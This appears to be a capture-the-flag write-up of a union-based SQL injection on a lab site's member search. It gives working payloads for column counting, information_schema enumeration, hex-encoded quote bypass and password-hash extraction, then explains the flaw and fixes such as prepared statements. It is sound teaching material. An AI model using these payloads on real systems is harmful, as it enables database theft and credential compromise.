# SQL Injection - Member Search Vulnerability

## How I Found It

### 1. Initial Discovery
- Navigated to the Members page at `http://192.168.1.16/index.php?page=member`
- Noticed a search form with an `id` parameter that searches members by ID
- The URL structure was: `http://192.168.1.16/index.php?page=member&id=X`

### 2. Testing for SQL Injection
- First, I tested with a normal value: `?page=member&id=1` → returned one user
- Then tested with `?page=member&id=1 OR 1=1` → no error, suggesting possible SQL injection
- Tested with `?page=member&id=0=0` → returned multiple results with `ID: 0=0`, confirming the input was being directly inserted into the SQL query without sanitization

### 3. Determining Column Count
Used `ORDER BY` clause to find the number of columns in the SELECT statement:
- `?page=member&id=1 ORDER BY 1` → Success
- `?page=member&id=1 ORDER BY 2` → Success
- `?page=member&id=1 ORDER BY 3` → Error

**Conclusion:** The query returns **2 columns**

---

## How I Exploited It

### Step 1: Enumerate Database Tables

**Query used:**
```
?page=member&id=1 UNION SELECT null,table_name FROM information_schema.tables
```

**Result:** Found multiple tables, including a `users` table which looked promising.

### Step 2: Enumerate Columns in the Users Table

**Query used:**
```
?page=member&id=1 UNION SELECT null,column_name FROM information_schema.columns WHERE table_name=0x7573657273
```

**Note:** I used hex encoding `0x7573657273` (which is "users" in hex) because single quotes were being escaped.

**Result:** Found these columns:
- `user_id`
- `first_name`
- `last_name`
- `town`
- `country`
- `planet`
- `Commentaire`
- `countersign`

### Step 3: Extract All User Data

**Query used:**
```
?page=member&id=1 UNION SELECT first_name,countersign FROM users
```

**Result:** Retrieved all users and their hashed passwords (countersigns):
- User "Flag" had countersign: `5ff9d0165b4f92b14994e5c685cdce28`

### Step 4: Extract Additional Information

**Query used:**
```
?page=member&id=1 UNION SELECT first_name,Commentaire FROM users
```

**Result:** Found a critical hint in the Flag user's comment:
```
"Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
```

### Step 5: Crack the MD5 Hash

- Hash: `5ff9d0165b4f92b14994e5c685cdce28`
- Used online MD5 decryptor: https://md5decrypt.net/
- Result: `FortyTwo`

### Step 6: Follow the Instructions

Based on the comment hint:
1. Decrypted password: `FortyTwo` ✓
2. Converted to lowercase: `fortytwo`
3. Applied SHA256 hash:
```bash
echo -n "fortytwo" | sha256sum
```
4. **Final flag:** `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

---

## Why It Works (Vulnerability Explanation)

### The Vulnerability: SQL Injection

SQL Injection occurs when user input is directly concatenated into SQL queries without proper sanitization or parameterization.

### In this case:

The vulnerable code likely looks like this:
```php
$id = $_GET['id'];
$query = "SELECT first_name, surname FROM users WHERE id = " . $id;
$result = mysqli_query($connection, $query);
```

When I input `1 UNION SELECT null,table_name FROM information_schema.tables`, the actual query becomes:
```sql
SELECT first_name, surname FROM users 
WHERE id = 1 
UNION SELECT null,table_name FROM information_schema.tables
```

### Why UNION works:
- The `UNION` operator combines results from multiple SELECT statements
- Both SELECT statements must have the same number of columns (that's why I needed to find the column count first)
- This allows me to query ANY table in the database, not just the intended `users` table

### Why hex encoding (0x7573657273) was necessary:
- The application was escaping single quotes (`'users'` became `\'users\'`)
- Hex encoding bypasses this protection because it doesn't use quotes
- `0x7573657273` is interpreted directly as the string "users" by MySQL/MariaDB

### information_schema abuse:
- `information_schema` is a built-in MySQL/MariaDB database that contains metadata about all databases, tables, and columns
- It's readable by default, making it perfect for database enumeration during SQL injection attacks

---

## How to Fix It (Security Recommendations)

### 1. Use Prepared Statements (Parameterized Queries) - CRITICAL

**Instead of:**
```php
$id = $_GET['id'];
$query = "SELECT first_name, surname FROM users WHERE id = " . $id;
$result = mysqli_query($connection, $query);
```

**Use:**
```php
$id = $_GET['id'];
$stmt = $connection->prepare("SELECT first_name, surname FROM users WHERE id = ?");
$stmt->bind_param("i", $id);  // "i" means integer
$stmt->execute();
$result = $stmt->get_result();
```

**Why this works:** The database treats user input as DATA, not as CODE. The SQL structure is defined separately from the user input.

### 2. Input Validation

Validate that the `id` parameter is actually an integer:
```php
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($id === false) {
    die("Invalid ID");
}
```

### 3. Principle of Least Privilege

- The database user used by the web application should have minimal permissions
- It should NOT have access to `information_schema` tables beyond what's necessary
- Use separate database users with restricted permissions for web applications

### 4. Error Handling

- Don't display raw SQL errors to users (like "You have an error in your SQL syntax...")
- Log errors server-side for debugging
- Show generic error messages to users: "An error occurred. Please try again."

### 5. Web Application Firewall (WAF)

- Deploy a WAF to detect and block common SQL injection patterns
- However, don't rely solely on this - it's defense in depth, not a replacement for secure coding

### 6. Password Storage Best Practices

- Never store passwords in plaintext or with weak hashing (MD5 is broken)
- Use modern password hashing functions like `bcrypt`, `Argon2`, or `scrypt`
```php
$hash = password_hash($password, PASSWORD_ARGON2ID);
```

---

## Additional Notes

### OWASP Top 10:
This vulnerability is ranked #3 in the OWASP Top 10 (2021): **A03:2021 – Injection**

### Real-world Impact:
SQL Injection can lead to:
- Complete database compromise
- Data theft (customer information, credentials, etc.)
- Data manipulation or deletion
- Authentication bypass
